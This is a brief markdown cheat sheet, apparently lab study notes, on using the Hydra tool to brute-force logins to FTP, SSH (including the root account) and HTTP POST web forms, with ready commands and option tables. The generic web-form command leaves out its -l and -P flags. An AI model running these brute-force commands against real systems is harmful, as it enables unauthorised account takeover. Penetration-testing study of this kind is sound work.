### What is Hydra?

Hydra is a brute force online password cracking program, a quick system login password "hacking" tool.  

<br> 

### Hydra Commands

The options used in Hydra depend on the service (protocol) being attacked. As an example if trying to brute force **FTP** witht the username being `user` and a password list being `passlist.txt` use the following command:  

```
hydra -l user -P passlist.txt ftp://machine_ip

```  

<br> 

### SSH

To brute force a ssh server login as follows:  

```
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
``` 

|Option   | Description  |
|---|--- |
| `-l`      | specifies the (SSH) username for login     |
| `-P`   | indicates a list of passwords     |
| `-t`   | sets the number of threads to spawn     |  

As an exmaple, `hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh ` will run with the following arguments:  

- Hydra will use `root` as the username for `ssh`
- It will try the passwords in the `passwords.txt` file
- There will be four threads running in parallel as indicated by `-t 4`  

<br> 

### Post Web Form


Hydra can also be used to brute force web forms and knowing which type of request it is making GET or POST.
Use your browser's network tab (in developer tools) to see the request types or view source code:  

```
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```

|Option   | Description  |
|---|--- |
| `-l`      | specifies the (web form) username login |
| `-P`   | indicates a list of passwords     |
| `http-post-form`   | The type of the form is POST     |  
| `<path>`   |the login page URL, for example, `login.php` |
| `<login_credentials>`   | the username and password used to log in, for example, `username=^USER^&password=^PASS^` |
| `<invalid_response>`   | part of the response when the login fails |
| `-V`   | verbose output for every attempt |  


Here is a more specific example of a brute force POST login form:

```
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```  

- The login page is only`/`, i.e., the main IP address.
- The`username`is the form field where the username is entered
- The specified username(s) will replace`^USER^`
- The`password`is the form field where the password is entered
- The provided passwords will be replacing`^PASS^`
- Finally,` F=incorrect`is a string that appears in the server reply when the login fails


If a web server is listening on a non-default port number you can specify the port number using `-s <port>`:  

```
	hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
```   

[Reference](https://www.youtube.com/watch?v=8fs_7bm88GY)


